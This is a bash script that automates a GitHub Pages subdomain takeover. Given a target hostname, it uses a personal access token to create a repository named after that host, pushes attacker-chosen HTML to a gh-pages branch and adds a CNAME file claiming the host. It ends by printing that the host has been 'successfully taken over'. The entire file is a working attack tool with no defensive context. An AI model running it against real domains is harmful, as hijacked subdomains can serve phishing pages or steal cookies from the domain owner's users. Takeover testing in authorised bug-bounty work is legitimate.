#!/bin/bash
username="<Your GitHub Username>";
token="<Your GitHub Personal Access Token>";
content="<The HTML Contents of your Takeover Webpage!>";

host=$1;
cname=$(echo $host | base64);
webpage=$(echo $content | base64);

echo "Creating repository!";
curl -sH "Authorization: token "$token -d '{"name":"'$host'"}' https://api.github.com/user/repos &> /dev/null

sleep 1;

echo "Getting the SHA hash for branch!"
SHA=$(curl -sH "Authorization: token "$token https://api.github.com/repos/$username/$host/git/refs/heads/master | jq -r '.object.sha')

echo "Creating index.html in gh-pages!"
curl -X PUT -sH "Authorization: token "$token -d '{"path": "index.html", "content": "'$webpage'", "message": "Initial Commit!", "branch": "gh-pages", "sha": "'$SHA'"}' https://api.github.com/repos/$username/$host/contents/index.html &> /dev/null

sleep 5;

echo "Adding the Host CNAME!"
curl -X PUT -sH "Authorization: token "$token -d '{"path": "CNAME", "content": "'$cname'", "message": "Added CNAME!"}' https://api.github.com/repos/$username/$host/contents/CNAME &> /dev/null

echo "The Host "$host" has been successfully taken over!"
